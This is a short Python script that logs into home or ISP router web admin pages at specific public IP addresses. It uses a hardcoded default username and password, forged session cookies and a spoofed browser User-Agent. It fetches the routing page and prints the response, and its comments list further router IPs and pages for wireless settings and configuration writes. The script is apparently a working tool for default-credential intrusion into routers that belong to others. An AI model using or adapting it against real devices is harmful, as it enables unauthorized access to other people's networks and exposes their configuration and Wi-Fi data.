import requests 
from requests.auth import HTTPBasicAuth

#Q3BlMDRFcG0=
data = {
    "Username":"admin",
    "Password":"Cpe04Epm"
}
cookies = {
    "FirstMenu":"Admin_0",
    "SecondMenu":"Admin_0_0",
    "ThirdMenu":"Admin_0_0_0",
    "Language":"en",
    "Username":"admin",
    "Password":"Cpe04Epm",
    "Saveword":"0",
    "SessionID_R3":"1688935919"
}
    
#auth=HTTPBasicAuth("admin", "Cpe04Epm")
s = requests.Session()
headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
#html = open("wlan.txt","wb")
#r = s.post("http://181.129.126.217/html/status/deviceinfo.asp",data=data, headers=headers, timeout=None)
r = requests.get("http://181.128.240.136/html/network/route.asp",auth=HTTPBasicAuth("admin", "Cpe04Epm"), timeout=None, headers=headers) # http://181.129.126.217/index/login.cgi
# http://181.129.126.217/html/ntwkall/wlan.asp /lang/device.res
#http://181.128.234.196/html/ntwkall/setcfg.cgi?x=InternetGatewayDevice.LANDevice.1&RequestFile=/html/ntwkall/wlan.asp
#http://181.129.99.135/html/ntwkall/wlan.asp
print "HEADERS: "+str(r.headers)
print "STATUS CODE: "+str(r.status_code)
print "CONTENT: "+str(r.content)
print "COOKIES: "+str(r.cookies)
